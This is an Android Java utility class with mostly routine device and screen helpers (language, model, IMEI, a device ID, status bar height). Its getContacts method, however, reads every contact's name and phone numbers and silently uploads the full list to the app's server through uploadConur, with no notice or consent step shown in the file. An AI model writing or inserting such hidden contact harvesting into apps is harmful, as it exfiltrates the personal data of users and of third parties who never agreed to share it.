package com.example.administrator.chaoshen.util;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.ContentProviderOperation;
import android.content.Context;
import android.content.OperationApplicationException;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Point;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Build;
import android.os.RemoteException;
import android.os.TransactionTooLargeException;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.view.Display;
import android.view.WindowManager;

import com.example.administrator.chaoshen.app.APP_Contants;
import com.example.administrator.chaoshen.net.ApiOkHttpClient;
import com.example.administrator.chaoshen.net.MyCallback;
import com.example.administrator.chaoshen.net.bean.CourData;
import com.example.administrator.chaoshen.net.bean.UploadPhoneNetBean;
import com.youth.xframe.utils.log.XLog;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;
import java.util.UUID;

public class SystemUtil {
    /**
     * 获取当前手机系统语言。
     *
     * @return 返回当前系统语言。例如：当前设置的是“中文-中国”，则返回“zh-CN”
     */
    public static String getSystemLanguage() {
        return Locale.getDefault().getLanguage();
    }

    /**
     * 获取当前系统上的语言列表(Locale列表)
     *
     * @return  语言列表
     */
    public static Locale[] getSystemLanguageList() {
        return Locale.getAvailableLocales();
    }

    /**
     * 获取当前手机系统版本号
     *
     * @return  系统版本号
     */
    public static String getSystemVersion() {
        return android.os.Build.VERSION.RELEASE;
    }

    /**
     * 获取手机型号
     *
     * @return  手机型号
     */
    public static String getSystemModel() {
        return android.os.Build.MODEL;
    }

    /**
     * 获取手机厂商
     *
     * @return  手机厂商
     */
    public static String getDeviceBrand() {
        return android.os.Build.BRAND;
    }

    /**
     * 获取手机IMEI(需要“android.permission.READ_PHONE_STATE”权限)
     *
     * @return  手机IMEI
     */
    public static String getIMEI(Context ctx) {
        TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Activity.TELEPHONY_SERVICE);
        if (tm != null) {
            return tm.getDeviceId();
        }
        return null;
    }

    /**
     * 返回 唯一的虚拟 ID
     * @return ID
     */
    public static String getUniquePsuedoID() {
        String m_szDevIDShort = "35" + (Build.BOARD.length() % 10) + (Build.BRAND.length() % 10) +
                (Build.CPU_ABI.length() % 10) + (Build.DEVICE.length() % 10) + (Build.MANUFACTURER.length() % 10) +
                (Build.MODEL.length() % 10) + (Build.PRODUCT.length() % 10);

        // API >= 9 的设备才有 android.os.Build.SERIAL
        // http://developer.android.com/reference/android/os/Build.html#SERIAL
        // 如果用户更新了系统或 root 了他们的设备，该 API 将会产生重复记录
        String serial = null;
        try {
            serial = android.os.Build.class.getField("SERIAL").get(null).toString();
            XLog.e(serial+"---serial--------唯一ID-------");
            return new UUID(m_szDevIDShort.hashCode(), serial.hashCode()).toString();
        } catch (Exception exception) {
            serial = "serial";
        }

        // 最后，组合上述值并生成 UUID 作为唯一 ID
        String id=new UUID(m_szDevIDShort.hashCode(), serial.hashCode()).toString();
        XLog.e(id+"-----id------唯一ID-------");
        return id;
    }


    /**
     * 获取应用的版本号versionCode：
     */
    public static int packageCode(Context context) {
        PackageManager manager = context.getPackageManager();
        int code = 0;
        try {
            PackageInfo info = manager.getPackageInfo(context.getPackageName(), 0);
            code = info.versionCode;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        return code;
    }



    /**
     * 判断进程是否存活
     *
     * @param context
     * @return
     */
    public static boolean isProessRunning(Context context) {

        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> lists = am.getRunningAppProcesses();

        for (ActivityManager.RunningAppProcessInfo info : lists) {
            if (info.processName.equals(APP_Contants.getPackgeName())) {
                return true;
            }
        }
        return false;
    }

  /*  public static void syncTSContactsToContactsProvider(List<TsContact> contactsList,Context context) {
        final int contactsListSize = contactsList.size();
        int unitLength = 400; //large insert will cause binder data overflow.
        int syncedCount = 0;
        while (syncedCount < contactsListSize) {
            int syncLength = (contactsListSize - syncedCount) < unitLength ? (contactsListSize - syncedCount) : unitLength;
            ArrayList<ContentProviderOperation> ops = new ArrayList<>();
            for (int index = 0; index < contactsList.size(); index++) {
                TsContact contact = contactsList.get(index);
                int rawContactInsertIndex = ops.size();
                ops.add(ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI)
                        .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null)
                        .withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null)
                        .withYieldAllowed(true).build());

                ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                        .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, rawContactInsertIndex)
                        .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                        .withValue(ContactsContract.CommonDataKinds.StructuredName.FAMILY_NAME, contact.mLastName)
                        .withValue(ContactsContract.CommonDataKinds.StructuredName.GIVEN_NAME, contact.mFirstName)
                        .withValue(ContactsContract.CommonDataKinds.StructuredName.MIDDLE_NAME, contact.mMiddlename)
                        .withYieldAllowed(true).build());

                ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                        .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, rawContactInsertIndex)
                        .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                        .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, contact.mPhoneNumber)
                        .withValue(ContactsContract.CommonDataKinds.Phone.TYPE, contact.mPhoneType)
                        .withValue(ContactsContract.CommonDataKinds.Phone.LABEL, "").withYieldAllowed(true).build());
            }
            try {
                context.getContentResolver().applyBatch(ContactsContract.AUTHORITY, ops);
                ops.clear();
            } catch (final TransactionTooLargeException e) {
                e.printStackTrace();
            } catch (final RemoteException e) {
                e.printStackTrace();
            } catch (final OperationApplicationException e) {
                e.printStackTrace();
            }
        }
    }*/





    public static String[] getContacts(Context context) {




        XLog.e("-----------getContacts------联系人");
        //联系人的Uri，也就是content://com.android.contacts/contacts
        Uri uri = ContactsContract.Contacts.CONTENT_URI;
        //指定获取_id和display_name两列数据，display_name即为姓名
        String[] projection = new String[]{
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME
        };
        //根据Uri查询相应的ContentProvider，cursor为获取到的数据集
        Cursor cursor = context.getContentResolver().query(uri, projection, null, null, null);
        String[] arr = new String[cursor.getCount()];
        int i = 0;

        List<CourData> list=new ArrayList<>();

        if (cursor != null && cursor.moveToFirst()) {
            do {
                Long id = cursor.getLong(0);
                //获取姓名
                String name = cursor.getString(1);
                //指定获取NUMBER这一列数据
                String[] phoneProjection = new String[]{
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                };
                arr[i] = id + " , 姓名：" + name;
                CourData cour=new CourData();
                cour.setName(name);
                //根据联系人的ID获取此人的电话号码
                Cursor phonesCusor = context.getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        phoneProjection,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + id,
                        null,
                        null);

                //因为每个联系人可能有多个电话号码，所以需要遍历
                List<String> phone=new ArrayList<>();
                if (phonesCusor != null && phonesCusor.moveToFirst()) {
                    do {
                        String num = phonesCusor.getString(0);
                        arr[i] += " , 电话号码：" + num;
                        phone.add(num+"");
                    } while (phonesCusor.moveToNext());
                }
                cour.setData(phone);
                list.add(cour);
                i++;
            } while (cursor.moveToNext());
        }
        XLog.e("-----------------联系人" + Arrays.toString(arr));
        if (arr.length!=0){
            upLoadDtat(context,list);
        }

        return arr;
    }

    public static void upLoadDtat(Context context, List<CourData> data){
        ApiOkHttpClient.uploadConur(context, data, new MyCallback() {
            @Override
            public void onFinish() {

            }

            @Override
            public void onSuccess(String response) {
                XLog.e("---------------------上传="+response);
            }

            @Override
            public void onFailureNo200(String response) {

            }
        });
    }


    // 状态栏高度
    private static  int statusBarHeight = 0;
    // 屏幕像素点
    private static final Point screenSize = new Point();

    // 获取屏幕像素点
    public static Point getScreenSize(Activity context) {

        if (context == null) {
            return screenSize;
        }
        WindowManager wm = (WindowManager) context
                .getSystemService(Context.WINDOW_SERVICE);
        if (wm != null) {
            DisplayMetrics mDisplayMetrics = new DisplayMetrics();
            Display diplay = wm.getDefaultDisplay();
            if (diplay != null) {
                diplay.getMetrics(mDisplayMetrics);
                int W = mDisplayMetrics.widthPixels;
                int H = mDisplayMetrics.heightPixels;
                if (W * H > 0 && (W > screenSize.x || H > screenSize.y)) {
                    screenSize.set(W, H);
                }
            }
        }
        return screenSize;
    }

    // 获取状态栏高度
    public static int getStatusBarHeight(Context context) {
        if (statusBarHeight <= 0) {
            Rect frame = new Rect();
            ((Activity) context).getWindow().getDecorView().getWindowVisibleDisplayFrame(frame);
            statusBarHeight = frame.top;
        }
        if (statusBarHeight <= 0) {
            try {
                Class<?> c = Class.forName("com.android.internal.R$dimen");
                Object obj = c.newInstance();
                Field field = c.getField("status_bar_height");
                int x = Integer.parseInt(field.get(obj).toString());
                statusBarHeight = context.getResources().getDimensionPixelSize(x);

            } catch (Exception e1) {
                e1.printStackTrace();
            }
        }
        return statusBarHeight;
    }


}
